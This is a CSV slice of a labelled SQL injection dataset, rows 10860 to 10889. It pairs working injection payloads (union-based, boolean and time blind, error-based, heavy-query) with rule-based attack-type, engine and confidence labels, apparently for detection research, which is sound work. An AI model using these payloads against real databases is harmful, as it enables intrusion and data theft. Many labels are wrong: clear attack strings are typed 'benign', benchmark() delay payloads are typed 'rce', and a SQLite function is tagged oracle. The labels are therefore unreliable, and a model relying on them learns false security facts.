row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10860,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10861,"1', ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10862,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ""%"" = """,1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
10863,"1'|| ( select 'drna' from dual where 5082 = 5082 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) ||'",1,,rce,oracle,0.95,0x76555642 detected — rce injection (priority 1) on oracle,rule-based
10864,"1%"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
10865,"1 union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10866,"1%"" ) union all select null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10867,"-9356 or elt ( 1032 = 1032,3623 ) -- izgi",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10868,1 ) ) order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10869,"1' ) ) ) union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10870,"1"" ) ) as yosd where 1255 = 1255",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10871,"1%"" ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10872,"1"" ) as kslq where 8669 = 8669 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
10873,"1"" union all select null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10874,"1' ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10875,1 ) and 7533 = 7533 and ( 7175 = 7175,1,,boolean_blind,generic,0.95,7533 = 7533 and detected — boolean_blind injection (priority 8) on generic,rule-based
10876,"1"" ) ) and 7533 = 7533 and ( ( ""gkca"" = ""gkca",1,,boolean_blind,generic,0.95,7533 = 7533 and detected — boolean_blind injection (priority 8) on generic,rule-based
10877,"-4711%"" ) ) union all select 6737,6737,6737,6737#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10878,-7675%' ) ) ) order by 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10879,1'+ ( select goec where 9460 = 9460 rlike ( select ( case when ( 4740 = 1203 ) then 1 else 0x28 end ) ) ) +',1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
10880,1' ) where 3730 = 3730 and sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10881,"1'+ ( select iaeu where 5509 = 5509 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
10882,"1'|| ( select 'bmyt' from dual where 9407 = 9407 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",1,,time_blind,oracle,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
10883,"1 ) where 8671 = 8671 and make_set ( 4931 = 1642,1642 ) --",1,,boolean_blind,generic,0.95,8671 = 8671 and detected — boolean_blind injection (priority 8) on generic,rule-based
10884,-3596 ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 3645 = 3645,1,,boolean_blind,firebird,0.95,) and ( detected — boolean_blind injection (priority 8) on firebird,rule-based
10885,-2431' ) or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10886,"-8599 ) ) or elt ( 5628 = 2324,2324 ) and ( ( 1134 = 1134",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
10887,"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10888,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( 'rkoe' = 'rkoe",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
10889,"1' ) as jxqt where 4322 = 4322 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,4322 = 4322 or detected — boolean_blind injection (priority 8) on generic,rule-based
